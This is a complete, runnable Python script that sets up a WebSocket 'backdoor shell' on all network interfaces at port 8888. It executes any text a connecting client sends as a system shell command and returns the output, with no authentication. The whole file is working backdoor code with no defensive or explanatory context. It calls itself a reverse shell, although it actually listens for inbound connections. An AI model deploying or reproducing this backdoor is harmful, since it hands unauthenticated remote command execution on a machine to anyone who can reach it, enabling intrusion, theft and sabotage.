#!/usr/bin/env python3
"""WebSocket reverse shell listener"""

import asyncio
import websockets
import subprocess
import os

async def shell(websocket, path):
    print(f"Connection from {websocket.remote_address}")
    await websocket.send("Connected to backdoor shell. Type commands:")
    async for message in websocket:
        try:
            result = subprocess.check_output(message, shell=True, stderr=subprocess.STDOUT, timeout=30)
            await websocket.send(result.decode())
        except subprocess.CalledProcessError as e:
            await websocket.send(f"Error: {e.output.decode()}")
        except Exception as e:
            await websocket.send(f"Error: {str(e)}")

async def main():
    async with websockets.serve(shell, "0.0.0.0", 8888):
        print("WebSocket shell listening on 8888")
        await asyncio.Future()

if __name__ == '__main__':
    asyncio.run(main())
